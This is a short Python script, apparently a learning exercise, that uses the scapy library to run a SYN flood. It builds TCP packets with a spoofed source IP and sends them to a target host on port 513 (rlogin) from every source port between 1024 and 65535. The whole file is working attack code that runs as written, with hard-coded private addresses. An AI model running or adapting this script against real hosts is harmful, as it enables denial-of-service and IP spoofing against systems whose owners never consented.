'''
Description: 
Author: yrwang
Date: 2021-09-01 17:38:25
LastEditTime: 2021-09-02 21:40:03
LastEditors: yrwang
'''
from scapy.all import *


def synFlood(src, tgt):
    for sport in range(1024, 65535):
        iplayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = iplayer/TCPlayer
        send(pkt)


# 源IP -> 目标IP
src = "10.1.1.2"
tgt = "192.168.1.3"
synFlood(src, tgt)
